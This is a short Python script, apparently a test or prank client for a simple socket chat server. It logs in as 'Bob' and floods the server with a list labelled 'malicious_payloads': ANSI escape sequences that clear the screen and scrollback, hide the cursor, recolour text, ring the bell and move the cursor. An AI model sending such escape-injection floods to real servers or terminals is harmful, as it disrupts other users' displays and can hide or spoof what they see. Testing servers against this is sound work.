import socket
import time

from config import PORT,HOST,CODE

malicious_payloads = [
    "\x1b[2J",  # Clear screen
    "\x1b[3J",  # Clear scrollback
    "\x1b[?25l",  # Hide cursor
    "\x1b[0m\x1b[41m\x1b[37m",  # Red background, white text
    "\a\a\a",  # Bell sound (beep) x3
    "\x1b[10;10H",  # Move cursor to 10,10
]

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((HOST, PORT))
    print("Подключился к серверу !")

    sock.sendall("Bob".encode(CODE))

    for i in range(1000):
        for str in malicious_payloads:
            sock.sendall(str.encode(CODE))


    time.sleep(1000)